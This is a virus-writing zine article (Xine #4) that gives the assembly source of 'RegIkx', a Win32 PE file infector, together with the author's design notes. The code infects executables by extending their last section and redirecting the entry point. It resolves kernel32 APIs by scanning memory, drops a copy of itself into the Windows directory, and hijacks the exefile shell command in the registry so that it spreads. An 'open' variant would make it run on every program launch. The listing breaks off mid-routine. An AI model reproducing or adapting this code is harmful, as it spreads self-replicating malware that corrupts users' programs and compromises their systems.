   ;                                        /-----------------------------\
   ;                                        | Xine - issue #4 - Phile 205 |
   ;                                        \-----------------------------/

   ;Again a new virus idea, for a long time I have chatted away about
   ;this type of virus. Finaly relaizing that no one else wanted to do this
   ;I did it. This was a what i call a dead time project. Whenever I had
   ;spare time I worked on it sometimes it sat for a month b4 I looked at it
   ;again. This lead to strange code, due to every time I did feel like
   ;working on it I was intrigue with a new concept, nothing major, but enough
   ;to make the code seem more hodgepodge then my usual mess :>. (Sorry to all
   ;the coders who do not like upper and lower mix of chars, but I sorta like it)
   ;Alright the program is made up to 2 parts One a regular PE file made by tasm
   ;but modified with debug.

   ;First it is compile with
   ;tasm32 /ml /m3 reg,;
   ;tlink32 /Tpe /aa /c /B:0400000 -x  reg,r1,,,
   ;this creates a file that has .DATA only section , I hand code the IData stuff
   ;see cerebrus virus for more info on this
   ;then I use a debug script to modify a few things

   ;Increase Header size to 600h           Allow the full header
   ;                                       to be copy into Memory

   ;Set Idata Location                     So OS knows where to load the Idata
   ;Set Idata Size
   ;
   ;Set Flags of the DATA sect to R/W/Exec Not really need since data will
   ;                                       execute fine
   ;
   ;Edit the BASE of the Code              Since I have no code section
   ;Edit Size     of Code                  Tasm does not set these and WinNt
   ;                                       Chokes if not set properly

   ;Move the PE Header from 100h to 80h    Why not, actual gives me more free
   ;                                       space in one spot for say other
   ;                                       viruses Not really use in this virus
   ;Move any code up to the end of the header area again not really use in this
   ;virus just an idea I was curoius about.
   ;
   ;Allright now we have a 2000h exe which when run will look for the command line
   ;and execute the exe file if it is there
   ;Now before it executes the file it will infecting using standard technique of
   ;expanding the last section and ensuring the last section is r/w
   ;How may you ask does the file get someone to give it a exe name as a command
   ;line you may ask. When the file it has infected is run the second part of
   ;the code it run. Using standard vx technique's to find the k32 API it needs
   ;It first reads the Registry entry  "HKEY_CLASSES_ROOT\exefile\shell\test\command",0
   ; it checks if the entry starts with RegIkx.exe, if so dont bother if not
   ;it writes the entry "RegIkx.exe" %1 %*
   ;(So when someone right clicks on the mouse over a ExeFile they will see
   ;Test as one of the Options if then then click test windows runs
   ;"Regikx.exe" FullPathFileName CommandLine Parms this is how the file spreads)
   ;Now it gets the Windows Directory and creats RegIkx.exe in it. then
   ;close the File, close the Registry and jmps back to the host
   ;Clear as Murky Water right :>
   ;I Use a space as first char of the last section name to id file as infected
   ;Display a poem when no command line is passed to it
   ;may as well confuse the issue in case a user does decide to run the exe by
   ;itself
   ;
   ;Well the rest is in the code, you can recompile with a Diffrent Register
   ;setting which will then call RegIkx every time the user clicks on a exe
   ;I have that setting rem out for testing purposes
   ;Well enjoy and Read the code
   ;Murkry
   ;-------------------------------------------------------------
   ;As usual what follows is notes I made as I was working on this
   ;project
   ;-------------------------------------------------------------
   ;This is being compile with no code of idata section
   ;only the a DATA section which in Win9? can still execute code???
   ;as a side note this seems that while code is code data it code as well
   ;you can then put code in the k32 data section and execute it....
   ;not sure if winnt supports this but I did try stack space in winnt 4.0,
   ;yes it let me execute it fine.
   ;to be sure I am altering the flags to be code and exec as well as
   ;the data the flags will then be 600000E0
   ;
   ;The "RealFile will infect the files off the commandline
   ;copying the first 600h bytes from the MZ header then copy the
   ;next 600 from the start of the "virii" code down the infect addtion
   ; to the end file should be about 800-900; probaly be easier to copy
   ;the header to the top of the section then we can add and change things as we
   ;go
   ;Why 600 when the header size is usual 400h simple Borland pads everthing
   ;so there is a extra 200 bytes that lay in waste on disk but do not get loaded
   ;to memory, unless you make the header size 600h which I do in the debug
   ;script
   ;so the file looks like this
   ;       on disk                     in memory after  move
   ;       ----------------            -----------------
   ;       MZ                   400000 MZ
   ;    80 PE                       80 PE
   ;       data or code                   data or code but exec not Write
   ;   600 Excutable code          600 End of header
   ;       idata cod data       401000 MZ
   ;                                80 PE
   ;                                   Usable Data or code r/w exec
   ;                               600 Idata code data
   ;
   ;Now when writing this file  as infection write from 401000 to end of code
   ;to recreate Excutable file write from 401000 for lenght of code pad to 4096
   ;****Note in winnt4.0 the file would just "exit" do nothing or at least
   ;appear to do that. Under Td32 in NT it would "error loading program"
   ;So I made entries to the SizeOfCode and BaseOfCode this allow it to work
   ;but then failed cause I cheated and used "USER32" not "USER32.DLL ok adjusted for
   ;that and all OK..Cept run from command line only file name but click on then
   ;full path name was passed. Oh well, I guess that there are some incompatiblity
   ;with the win32 subsets ;))

   ;Reg setting exefile infect "D:\TASM\VIRII\REGHOOK\R1.EXE" %1 %*
   ;Of course in real virus the exe would be in a windows directory
   ;so "R1.EXE" %1 %*  would work fine and Of course I use RegIkx.exe for
   ;final edition

   ;ideas to play with
   ;   Stack Infector use stack for code and data
   ;   modify the .text section to be data as well then you can write the
   ;      orginal "host" back after spreading
   ;   have a small "dos" prog modify one of the system dll's for code to data
   ;     the real virus code then goes tsr at the second run
   ;   Write code that infects the data section and runs from there as well
   ;     just mod the eip to pnt there this opens up the idata,data,resc,reloc
   ;     just about any section can  be infected... 'cept AV'ers check this
   ; While I do not try to hide from AV'rs scanners I do try to mention methods
   ;that Av'ers should use

   .486
   .model flat, stdcall

   DEBUG EQU 1             ;REM THIS LINE TO REMOVE DEBUG CODE
   ;-------------------------------
   ;Used for access to the Registery
   HKEY_CLASSES_ROOT equ   80000000h
   REG_SZ            equ   1
   REG_OPTION_NON_VOLATILE equ 0

   ;sometime I used this, note that many API return nonzero to signify
   ; True so  True != 0 is a better check
   True    equ     1
   False   equ     0

   ;MZ pnter to PE or NE or LE ...
   NEptr           equ     03ch

   ;Locations in PE header use JQwerty's(29A) inc files for more complete
   ;header info and other nice tricks
   SectHdrSze      equ     028H
   ImageSze        equ     050h
   PEHdrSze        equ     0F8h

   ;-------------------------------
   ;PE Header Offsets
   NumOfSect       equ     6
   EipOff          equ     28h
   SectAlign       equ     38h
   FileAlign       equ     3Ch

   ;-------------------------------
   ;Section Entry Offsets
   SectName        equ     0h
   SectVsze        equ     8h
   SectVadd        equ     0Ch
   SectRawSze      equ     10h
   SectPtrRaw      equ     14h
   ;Stuff not used
   SectChar        equ     24h

   ;-------------------------------
   ;USed in CreateFile API calls
   GENERIC_READ    equ     80000000h
   GENERIC_WRITE   equ     40000000h
   FATTR_NORMAL    equ     0
   OPEN_EXISTING   equ     3
   CREATE_NEW      equ     1

   ;Used for the Idata Section to get proper offsets
   ;I sometime have very convolted code that could be replaced with
   ; One static equ rather than the nonsense I typed, live with it...
   ;better yet..consider it a exercise for the student...

   LoadAT  equ     01000h
   offs    equ     offset PEheader ;+  LoadAT   + 400000h

   filler  equ     offset Data - PEheader

   ;Start of Code which is actaul in a section called Data


   .data                                   ;the data area
   PEheader:       ;will hold the Orginal MZ/PE info
           db      1A0h dup (00h)
   ;-------------------------------------------------------------
   ;Anything beyond this is data that will be carrier over from
   ;infection to infection after the first infection this will
   ;be copyed to a buffer area to be used for our code
   ;I used a debug script to make the intial file
   ;in most case this is just for placeholders exeptions are strings
   ;or numerics the virus really needs then they would be placed here
   ;then moved by the debug script
   sBlank          db      ' ',0
   Temp            dd      ?       ;Used for temp storage
   fHandle         dd      ?       ;Open File Handle
   PtrAddNew      dd      ?       ;Where the write the New Info

   AddSize         dd      ?       ;Amount we have added to the file

   ;NewEip          dd      ?

   ProcessInfo     dd      4h dup(?)
   StartupInfo     dd      18h dup(?)

   FileName        db      256 dup(0)
   EXEcName        db      256 dup(0)

   crTime          dd      2 dup (0)
   laTime          dd      2 dup (0)
   lwTime          dd      2 dup (0)

   ;*******temp    db      "c:\windows\notepad.exe",0

   BodyTitle       db      "Stoddart, And It Never Comes Again",00h
   BodyMsg         db      "There are gains for all our losses,",0dh,0ah
                   db      " There are balms for all our pain,",0dh,0ah
                   db      "But when youth, the dream, departs",0dh,0ah
                   db      "It takes something from our hearts,",0dh,0ah
                   db      " and it never comes again",0dh,0ah
                   db      0dh,0ah,0dh,0ah,0dh,0ah
                   db      "             Murkry/IkX",0dh,0ah
                   db      "Making life fun through 'tronic life",0dh,0ah
                   db      "             RegIkx.ExE",0dh,0ah,00
   ;-------------------------------------------------------------
   ;Data area stops and the place holder takes over
   ;place holder used the formala so the IDATA always starts at 600h

   Data:   ;place holder so we pad this out properly
           db      600h -  filler dup (00h)
   ;The Infection part of the Virus uses the
   IDATA:
             DD      offset API_LOC2b - offset PEheader + LoadAT
                                   ;  usual this has a redunat entry
                                   ;We are not skipping it
                                   ;  offset API_LOC1 - offset PEheader + LoadAT

   T1:     dd      0               ;time date stamp
           dd      0               ;where in memory this dll is loaded

           DD      offset DLL1 - offset PEheader + LoadAT

           DD      offset API_LOC2 - offset PEheader + LoadAT

   ;--------second DLL

           DD      offset API_LOC2Ab - offset PEheader + LoadAT
                                   ;  usual this has a redunt entry
                                   ;We are  not skipping it
                                   ;  offset API_LOC1 - offset PEheader + LoadAT

   T2:     dd      0               ;time date stamp
           dd      0               ;where in memory this dll is loaded

           DD      offset DLLA - offset PEheader + LoadAT

           DD      offset API_LOC2A - offset PEheader + LoadAT
           DD      00000000H


           DB       10H DUP(0)

   API_LOC2:
   exitp           DD      offset FUNC1 - offset PEheader + LoadAT    ;
   beep            DD      offset FUNC2 - offset PEheader + LoadAT    ;4h
   ;VxdCall0       DD      80000001h                                  ;8h
   getcomline      DD      offset FUNC3  - offset PEheader + LoadAT    ;Ch
   createp         DD      offset FUNC4  - offset PEheader + LoadAT    ;10h
   Copy            DD      offset FUNC5  - offset PEheader + LoadAT
   Create          DD      offset FUNC6  - offset PEheader + LoadAT
   FileP           DD      offset FUNC7  - offset PEheader + LoadAT
   Read            DD      offset FUNC8  - offset PEheader + LoadAT
   Write           DD      offset FUNC9  - offset PEheader + LoadAT
   Close           DD      offset FUNC10 - offset PEheader + LoadAT
   FindFirst       DD      offset FUNC11 - offset PEheader + LoadAT
   FindNext        DD      offset FUNC12 - offset PEheader + LoadAT
   CloseFind       DD      offset FUNC13 - offset PEheader + LoadAT
   FileSize        DD      offset FUNC14 - offset PEheader + LoadAT
   WinEx           DD      offset FUNC15 - offset PEheader + LoadAT
   GetTime         DD      offset FUNC16 - offset PEheader + LoadAT
   SetTime         DD      offset FUNC17 - offset PEheader + LoadAT
                   DD      0
   API_LOC2A:
   msgbox          DD      offset FUNCA - offset PEheader + LoadAT

                   DD      0

   SizeAPIAdd      equ     $ - Offset API_LOC2
   ;======================================================================

   API_LOC2b:
   exitpb           DD      offset FUNC1 - offset PEheader + LoadAT    ;
   beepb            DD      offset FUNC2 - offset PEheader + LoadAT    ;4h
   ;VxdCall0b         DD      80000001h                                  ;8h
   getcomlineb      DD      offset FUNC3  - offset PEheader + LoadAT    ;Ch
   createpb         DD      offset FUNC4  - offset PEheader + LoadAT    ;10h
   Copyb            DD      offset FUNC5  - offset PEheader + LoadAT
   Createb          DD      offset FUNC6  - offset PEheader + LoadAT
   FilePb           DD      offset FUNC7  - offset PEheader + LoadAT
   Readb            DD      offset FUNC8  - offset PEheader + LoadAT
   Writeb           DD      offset FUNC9  - offset PEheader + LoadAT
   Closeb           DD      offset FUNC10 - offset PEheader + LoadAT
   FindFirstb       DD      offset FUNC11 - offset PEheader + LoadAT
   FindNextb        DD      offset FUNC12 - offset PEheader + LoadAT
   CloseFindb       DD      offset FUNC13 - offset PEheader + LoadAT
   FileSizeb        DD      offset FUNC14 - offset PEheader + LoadAT
   WinExb           DD      offset FUNC15 - offset PEheader + LoadAT
   GetTimeb         DD      offset FUNC16 - offset PEheader + LoadAT
   SetTimeb         DD      offset FUNC17 - offset PEheader + LoadAT
                    DD      0
   API_LOC2Ab:
   msgboxb          DD      offset FUNCA - offset PEheader + LoadAT

                    DD      0
   ;------------------------names of DLL

   DLL1    DB      'KERNEL32.DLL',0
   DLLA    DB      'USER32.DLL',0

           dw      0               ;ends dll names

   FUNC1   dw      0
           db      'ExitProcess',0

   FUNC2   dw      0
           DB      'Beep',0

   FUNC3   dw      0
           DB      'GetCommandLineA',0

   FUNC4   dw      0
           db      'CreateProcessA',0

   FUNC5   dw      0
           db      'CopyFileA',0

   FUNC6   dw      0
           db      'CreateFileA',0

   FUNC7   dw      0
           db      'SetFilePointer',0

   FUNC8   dw      0
           db      'ReadFile',0

   FUNC9   dw      0
           db      'WriteFile',0

   FUNC10  dw      0
           db      'CloseHandle',0

   FUNC11  dw      0
           db      'FindFirstFileA',0

   FUNC12  dw      0
           db      'FindNextFileA',0

   FUNC13  dw      0
           db      'FindClose',0

   FUNC14  dw      0
           db      'GetFileSize',0

   FUNC15  dw      0
           db      'WinExec',0

   FUNC16  dw      0
           db      'GetFileTime',0

   FUNC17  dw      0
           db      'SetFileTime',0


           db      0                       ;end of Function list for this DLL


   FUNCA   dw      0
           db      'MessageBoxA',0
           dw      0

           db      0               ;end the function list
           db      0               ;end the DLL list


   EndIDATA:
   ;By Default this will be R/W Exec section
   Begin:
          ;move the header into our section
          ;really so this is info will be R\W
           mov     eax,VSize
           call    $ + 5           ;Need any value in our address
           pop     Eax             ;area for GetMZ
           Call    GetMZ           ;Eax will return pntr to MZ header
           Mov     Esi,Eax
           mov     Edi,offset PEheader
           xor     ecx,ecx
           mov     ch,6            ;600 bytes
           rep     movsb



          ;***Get CommandLine
           Call    FillFileNames

           or      Eax,Eax         ;Eax = Zero then no file to infect or run
           je      NoFileToExec


           Call    InfectFile

           IFDEF DEBUG
                   push     Eax
                   call     msgbox, large 0, Offset EXEcName ,offset FileName,Large 1
                   pop      Eax
           ENDIF

           ;this could be used but to failed in one test in winnt
           ;CALL    WinEx, Offset EXEcName, large 1
           ;there was probaly another issue here

           ;Run the file using CreateProcess
                    Call    createp,       \
                    offset FileName,       \   ;module name
                    offset EXEcName,       \   ;command line
                    large 0,               \   ;sec attr
                    large 0,               \   ;thread sec
                    Large False,           \   ;inherit handles
                    large 0,               \   ;create flags
                    large 0,               \   ;Enviroment
                    large 0,               \   ;current directory
                    offset  StartupInfo,   \   ;startup info
                    offset ProcessInfo        ;process info
                    jmp    ExitMain

   NoFileToExec:
           push     Eax
           call     msgbox, large 0, Offset BodyMsg ,offset BodyTitle,Large 40h
           pop      Eax

   Problem:

   NoCommandLine:

   ExitMain:
          push     -1
          call     exitp
   ;------------------------------------------------------------------
   InfectFile      PROC
                   PushA

   ;Open the File r/w using Create file

           Call    dword ptr [Create] ,           \
                   offset FileName,               \;File to Open
                   GENERIC_READ or GENERIC_WRITE, \
                   large 0,                       \
                   Large 0,                       \
                   large OPEN_EXISTING,           \
                   large 0,                       \
                   large 0

                   mov     dword ptr [fHandle],eax
                   inc     Eax
                   je      @@FileNotOpenErr
                   ;fBuff where to read info to

           Call    GetTime,[fHandle],offset crTime,offset laTime,offset lwTime

           Call    Read ,                  \
                   [fHandle],              \ ;handle
                   offset fBuff,           \ ;where to read to
                   400h,                   \ ;how much to read
                   offset Temp,            \ ;how much was read
                   large 0                   ;overlapped amount not used win95


           Or      eax,eax                 ;Check if All is ok
           jz      @@ErrorFileOpenErr
           cmp     dword ptr [Temp],400h   ;Did we read all We wanted to
           jne     @@ErrorFileOpenErr

           lea     Esi, [fBuff + NEptr]    ;Get the ptr to the PE
           lodsd                           ;It would probaly be safer to
           or      Eax,Eax
           jz      @@ErrorFileOpenErr      ;Not a PE

           cmp     Eax,1a0h                ;If greater than this then avg
           jg      @@ErrorFileOpenErr      ;PE hdr would not fit in remaining
                                           ;space so quit

           add     eax,Offset fBuff        ;check for MZ as well
           xchg    Esi,Eax                 ;feel free to add that Check
           cmp     word ptr [ESI],"EP"     ;if you Like
           jne     @@ErrorFileOpenErr

           ;Next check to see if we have the Section Entry for the
           ;last Section
           ;ESI pnts to the PE offset

           mov     ax,word ptr [Esi +  NumOfSect]
           cwde                                    ;Convert ax to Eax
           dec     Eax

           mov     Ecx,SectHdrSze
           mul     Ecx

           Add     Eax,PEHdrSze
           cmp     Eax,400h
           jg      @@ErrorFileOpenErr

           add     Eax,Esi         ;Edi = offset to the LastSection
           xchg    Edi,Eax


           ;Now need to modify this last section
           ;Will Need to get FileSize as well....

           ;Debug just to see last section name if ".?????" infect
           ;if " ??????" already infected
           IFDEF DEBUG
                   push     Eax
                   call     msgbox, large 0,  Edi ,Edi ,Large 1
                   pop      Eax
           ENDIF

           ;check For Infection
           mov     bl,byte ptr [Edi]
           cmp     bl,20h                  ;check for space as first char
           je      @@InfectedAlready

           ;Otherwise assume we will infect
           mov     byte ptr [Edi],20h

           ;Get Eip and move it to the return area
           mov     Ebx, dword ptr [Esi + EipOff]
           mov     dword ptr [RegHook + 1], Ebx

           ;Set New Eip
           mov     Ebx,[Edi + SectRawSze]                  ;Get New Eip
           add     Ebx,[Edi + SectVadd]                    ;
           add     Ebx,Offset RegHook - offset PEheader    ;
           mov     [Esi + EipOff],Ebx                      ;Store It

           ;Setup How where we are adding all the code
           Mov     Eax, dword ptr [Edi + SectRawSze]
           Add     Eax,dword ptr[Edi + SectPtrRaw]
           Mov     [PtrAddNew],Eax

           ;Now We need to modify the last Section entry to
           ;hold the new code
           xor     Edx,Edx
           mov     Eax,VSize
           add     Eax, dword ptr [Edi + SectRawSze]
           dec     Eax
           or      Edx,Edx
           jne     @@ErrorFileOpenErr

           ;Update Section Raw Data Size
           mov     Ecx,[Esi + FileAlign]
           add     Eax,Ecx
           dec     Eax
           div     Ecx
           Mul     Ecx

           ;Save how much we will add to the file
           Push    Eax
           sub     Eax,[Edi + SectRawSze]
           mov     [AddSize],Eax
           Pop     Eax

           ;save the new raw data size of the section
           mov     [Edi + SectRawSze],Eax

           ;Using the new Raw Data Size update
           ;the Section virtual Size
           mov     Ecx,[Esi + SectAlign]
           dec     Eax
           add     Eax,Ecx
           div     Ecx
           Mul     Ecx

           ;while here lets update the ImageSze as well
           ;since some progs do not use a correct val in Vsize
           ;we make sure that our value is at least on a section alignment
           push    Eax
           sub     Eax,[Edi + SectVsze]
           dec     Eax
           div     Ecx
           mul     ecx
           add     [Esi + ImageSze],Eax
           pop     Eax

           mov     [Edi + SectVsze],Eax
           or     [Edi + SectChar],80000000h

           ;Now move the file ptr to the new size
           ;write this to the file
           ;Goto the start of the file and write the new Header
           ;close the file

           ;Set the ptr to the place where the old info ended
           Call dword ptr [FileP] , [fHandle], dword ptr [PtrAddNew] , large 0, large 0

           ;Write to the file using Write
                   Call    dword ptr [Write],              \;
                                   [fHandle],              \;handle
                                   offset PEheader,        \;write from
                                   dword ptr [AddSize],    \;size
                                   offset Temp,            \;how much written
                                   large 0                 ;


           Call dword ptr [FileP] , [fHandle], large 0 , large 0, large 0

           ;Write to the file using Write
                   Call    dword ptr [Write],              \;
                                   [fHandle],              \;handle
                                   offset fBuff,        \;write from
                                   0400h,    \;size
                                   offset Temp,            \;how much written
                                   large 0                 ;

           Call    SetTime,[fHandle],offset crTime,offset laTime,offset lwTime



   @@InfectedAlready:
   @@ErrorFileOpenErr:
                   ;Close the file

                   Call    Close, [fHandle]
   @@FileNotOpenErr:
                   PopA
                   Ret
                   EndP
   ;------------------------------------------------------------------

   FillFileNames   PROC


           call     getcomline
           ;returns EAX = CommandLine


   ;Due to the way this virus will "hook" the registery it should always
   ;recieve "regIKX.exe" Host.exe args
   ;So to find the File we look for .exe
   ;first move the exe name to the FileNAme
   ;then Move the Entire line to the EXEcName

           ;move Eax to the command args

   @@Next1:
           inc     Eax                     ;Get past first "
           cmp     byte ptr [Eax],'.'      ;Find Next
           jne     @@Next1

           mov     ebx,dword ptr [eax]     ;ebx = "EXE."
           and     EBX,0DFDFDFFFH
           cmp     EBX,"EXE."
           jne     @@Next1


           inc     Eax     ;.
           inc     Eax     ;E
           inc     Eax     ;X
           inc     Eax     ;E      ;At this point we should be looking at the
                                   ;Next file we have to run and potential
                                   ;any command line paremters to that file


   @@Next2:
           cmp     byte ptr [Eax],'"'      ;
           jne     @@skip
           Inc     eax
   @@skip:
           cmp     byte ptr [Eax]," "      ;
           je      @@Space                   ;we have command line info

           cmp     byte ptr [Eax],00
           je      @@NoCommandLine

   @@Space:
           ;Load the  FileName and EXEcName
           mov     edi,offset FileName
           mov     esi,eax

   @@RemoveSpace:
           cmp     byte ptr [esi]," "
           jne     @@NextNameByte
           inc     esi
           jmp     @@RemoveSpace

   @@NextNameByte:
           lodsb

           cmp     al,"."
           je      @@a1
           cmp     al,0
           je      @@NoFileToExec
           jmp     @@Cn1
   @@a1:
           mov     Ebx,Dword ptr[ Esi -1]
           and     EBX,0DFDFDFFFH
           cmp     EBX,"EXE."
           jne     @@Cn1
           mov     [Edi],Ebx
           mov     [Edi + 256d],Ebx
           lea     Esi, [Esi+3]
           lea     Edi, [Edi+4]
           je      @@EndExE
   @@Cn1:
           stosb
           mov     byte ptr [edi + 255D],al
           Jmp     @@NextNameByte
   @@EndExE:
           push    Edi
           xor     al,al
           stosb

           ;finish the EXEcName
           pop     edi
           inc     Edi
           lea     edi,[edi+255D]
           mov     al,20h
   @@Cn3:
           stosb
           lodsb
           cmp     al,00
           je      @@NameDone
           jmp     @@Cn3
   @@NameDone:

           ret

   @@NoCommandLine:
   @@NoFileToExec:
           XOR     Eax,Eax

           ret
           EndP

   ;----------------------------------------------------------------
   RegHook:
           db      68h
           dd      ?
           pushA

   ;I like my GetMZ routine but, I found a major bug
   ;while the odds are small that it will find a MZ and then a PE that
   ;is the wrong one it can happen and this virus is an examaple of that
   ;when it infects a file which has an (PE) file offset of 1000h when you
   ;round the offset given in the eax to the last offset of 1000h you are
   ;now pointing at the first byte of this virus in that file then you check
   ;for MZ, PE you find it ... Not the host start, but the virus start. Oh well
   ;cant be sure on everything so I "fix" it by ensureing that the
   ;the value in Eax is one less then the start of the virus
           Call    H1
   H1:     Pop     Eax
           Sub     Eax,  offset H1 - Offset PEheader
           dec     Eax
           call    GetMZ                   ;Find where this file is loaded then
           add     [esp + 20h],eax         ;fix the return adress

           ;virus is set to return to the host when done
           ;now get the pntr off the stack that pnts to a K32 address
           ;use that to find the address to getprocaddress

           mov     Eax,[esp + 24h]         ;value inside Kernel32
                                           ;usauly...
           call    GetMZ                   ;Get the start of the k32
           or      Eax,Eax                 ;problem bail..
           jz      UhOh

           call    GetAPI                  ;get the Get Process Address
           or      Eax,Eax
           jz      UhOh                    ;problem bail


           pusha

           mov     ecx,SizeAPIAdd

           Call    $ + 5
           add     dword ptr [esp],Offset API_LOC2b - $     ;push a location
           pop     Esi

           Call    $ + 5
           add     dword ptr [esp],Offset API_LOC2 - $      ;push a location
           pop     Edi
           rep     Movsb

           xor     Eax,EAx
           Call    $ + 5
           add     dword ptr [esp],Offset T1 - $      ;push a location
           pop     Edi
           Stosd
           Stosd

           Call    $ + 5
           add     dword ptr [esp],Offset T2 - $      ;push a location
           pop     Edi
           Stosd
           Stosd

           popa


           push    Eax             ;Push the Eax
           Call    SetReg          ;Acual work is done here


   UhOh:
           popA
           ret

           ;Make Section R\W and Exec
           ;
           ;CheckReg
           ;  CreateFile
           ;  SetReg
           ;CloseReg
           ;Host

   ;=====================================
   ;Passed to it
   ;On stack K32 = Kernel32 API
   ;and that fs:[14] = GetProcessAddress
   ;
   SetReg  Proc  WINDOWS PASCAL
   arg     @@K32:DWORD           ;args passed to us
   ;local variable space
   local   @@hAdv:DWORD          ;advapi32 handle
   local   @@LoadLib:DWORD       ;Address if LoadLib

   local   @@RegOpen:DWORD
   local   @@RegSet:DWORD
   local   @@RegQuery:DWORD
   local   @@RegEnum:DWORD
   local   @@RegClose:DWORD

   local   @@Write:DWORD
   local   @@CreateF:DWORD
   local   @@CloseH:DWORD
   local   @@Read:DWORD
   local   @@hKey:DWORD
   local   @@mBox:DWORD
   local   @@Buff:DWORD
   local   @@Fhandle:DWORD
   local   @@Temp:DWORD

           call    @@GetLib
           db      "LoadLibraryA",0
   @@GetLib:
           push    @@K32
           call    fs:[14h]
           mov     @@LoadLib,Eax

           call    @@GetAdv
           db      "Advapi32.dll",0
   @@GetAdv:
           call    @@LoadLib

           mov     @@hAdv,Eax
           or      eax,eax         ;check to see if all is ok
           je      @@uups
   ;Now have all that is needed to read/write to a regisrty
   ;Try to open the Reg

   ;Attempt to open the key or create a new one
   ;-------------------------------------------------
           call    @@GL1
           db      "RegCreateKeyExA",0
   @@GL1:
           push    @@hAdv
           Call    @@GetProcAdd


           Call    @@Disp
           dd      ?
   @@Disp:

           ;push    @@hKey
           LEA     ESI,@@hKey
           PUSH    ESI
           push    Large 0                         ;sec attr null
           push    0F003Fh                         ;regsam
           push    large REG_OPTION_NON_VOLATILE   ;Options

           call    @@GetNullSt                     ;null string
           db      "",0
   @@GetNullSt:
           push    0                               ;resv

           call    @@Gs1
   ;StrLoc  db      "exefile\shell\open\command",0 ;for real use
   StrLoc  db      "exefile\shell\test\command",0
   @@Gs1:
           push    LARGE HKEY_CLASSES_ROOT
           call    ecx

           or      Eax,Eax
           jne     @@uups          ;couldn't open the key


   ;Ok have open the key now read and check if its ours
   ;----------------------------------------------------------------
   ;Read the string
           call    @@GL2
           db      "RegQueryValueExA",0
   @@GL2:
           Push    @@hAdv
           Call    @@GetProcAdd



           Call    @@GetBufLen
           dd      255d
   @@GetBufLen:

           Call    $ + 5
           add     dword ptr [esp],Offset EXEcName - $     ;push a location
           pop     esi
           push    esi
           mov    dword ptr [@@Buff],esi                  ;of a buffer
                                                           ;save it
   ;        Call    @@GetStr
   ;@@st    db      255d dup(0)
   ;@@GetStr:

           Call    @@GetDataType
           dd      1
   @@GetDataType:
           push    large 0
           push    large 0
           push    [@@hKey]
           call    Ecx
   ;
           mov     esi,dword ptr[@@Buff]


           call    $ + 5
           add     dword ptr [esp],offset @@New - $
           pop     edi
           cmpsd
           je      @@CloseKey      ;allready done
   ;Ok its there but not ours so just unhook whatever is there and replace it
   ;need to make our file in the Windows system directory if we cant do that
   ;bail out
   ;----------------------------------------------------------------
   ;Createfile
   ;1 Get windows directory
   ;2 Try to Create File
   ;       Bail if it exists ???
   ;3 Write File from top 200 bytes
   ;  then Write again from top for rest of file
   ;4 close Handle

           call    @@GetWinDir
           db      "GetWindowsDirectoryA",0
   @@GetWinDir:
           push    @@K32
           call    fs:[14h]

           call    $ + 5
           add     dword ptr [esp],offset FileName - $
           pop     edi

           Push    255D
           Push    Edi
           Call    Eax
           or      Eax,Eax
           jz      @@Prob

           Push    Edi

   ;This is the Key Entry we want to write
   ;"ReGIkX.exe" %1  %*
           add     Edi,Eax
           mov     Eax, "GeR\"
           stosd
           mov     Eax,".XkI"
           stosd
           mov     Eax,"ExE" + 00
           stosd

   ;Ok on Stack is the ptr to the string for our new file
   ;for the hell of it I'll us the the GetProcAdd and the
   ;string for CreateFileA in the other part of the Virus

           call    $ + 5
           add     dword ptr [esp],offset FUNC6+2 - $      ;Address of Str
                                                           ;CreateFileA
           Push    @@K32
           Call    @@GetProcAdd


           Pop     Edi             ;New File and Widows Directory


           Xor     Eax,Eax

           Push    Eax
           Push    Eax
           Push    CREATE_NEW      ;Create New File
           Push    0
           Push    0
           Push    GENERIC_WRITE   ;Only Write
           Push    Edi

           Call    Ecx             ;CreateFileA

           mov     [@@Fhandle],Eax
           inc     Eax
           jz      @@Prob

   ;Write to the File
           call    $ + 5
           add     dword ptr [esp],offset FUNC9 + 2 - $      ;Address of Str
                                                             ;WriteFileA
           Push    @@K32
           Call    @@GetProcAdd
           mov     edi,ecx
   ;-------
           Push    Large 0                 ;Not used Overlapped

           ;Push    @@Temp                 ;used to hold how much is written
           LEA     ESI,@@Temp              ;
           PUSH    ESI                     ;

           push    600h                    ;size to write

           call    $ + 5
           add     dword ptr [esp],offset PEheader - $      ;Address of
                                                            ;Start of Virus
           Push    [@@Fhandle]           ;

           call    Ecx                     ;Write File

           or      Eax,Eax
           jz      @@ProbCloseFile

   ;--------

           Push    Large 0                 ;Not used Overlapped

           ;Push    @@Temp                 ;used to hold how much is written
           LEA     ESI,@@Temp              ;
           PUSH    ESI                     ;

           push    VSize                   ;size to write
          ; push    1A00h                   ;2000h - 600h from above

           call    $ + 5
           add     dword ptr [esp],offset PEheader - $      ;Address of
                                                            ;Start of Virus
           Push    [@@Fhandle]           ;

           call    Edi                     ;Write File

           or      Eax,Eax
           jz      @@ProbCloseFile

   ;--------
           Push    Large 0                 ;Not used Overlapped

           ;Push    @@Temp                 ;used to hold how much is written
           LEA     ESI,@@Temp              ;
           PUSH    ESI                     ;

           push    (2000h - 600h - VSize)  ;size to write


           call    $ + 5
           add     dword ptr [esp],offset PEheader - $      ;Address of
                                                            ;Start of Virus
           Push    [@@Fhandle]           ;

           call    Edi                     ;Write File

           or      Eax,Eax
           jz      @@ProbCloseFile



   ;-------------------------------------------------------------
    IFDEF DEBUG
                   push     Eax
                   call    @@GetDebug
                   db      "User32.dll",0
           @@GetDebug:
                   call    @@LoadLib

           call    @@DebugMess
                   db      'MessageBoxA',0
           @@DebugMess:
                   push    eax
                   call    fs:[14h]
                   xchg    eax,ecx

                   push    large 1
                   call    @@M1
                   db      "Write File Sucess",0
           @@M1:   call    @@M2
                   db      "GoodBye",0
           @@M2:   push    0
                   call    Ecx
                   pop     Eax
   ENDIF
   @@cont:
   ;----------------------

   @@ProbCloseFile:
   ;close the File
           call    $ + 5
           add     dword ptr [esp],offset FUNC10 + 2 - $   ;Address of Str
                                                           ;CloseHandle
           Push    @@K32
           Call    @@GetProcAdd

           mov     Eax,[@@Fhandle]
           call    Ecx


           ;Murk

   @@Prob:

   ;---------------------
   ;Now set the Registery key
           call    @@GL3
           db      "RegSetValueExA",0
   @@GL3:
           Push    @@hAdv
           Call    @@GetProcAdd


   ;        push    large 18D               ;Should be lenght of string below
           push    @@StrLen
           call    @@GetNew
   @@New:  db      '"ReGIkX.exe" %1 %*',0
   @@StrLen        equ      $ - Offset @@New
   @@GetNew:
           push    1
           push    0
           push    0
           push  [@@hKey]
           call   ecx

   ;--------------------
   @@CloseKey:
   ;Close the key
           call    @@GL4
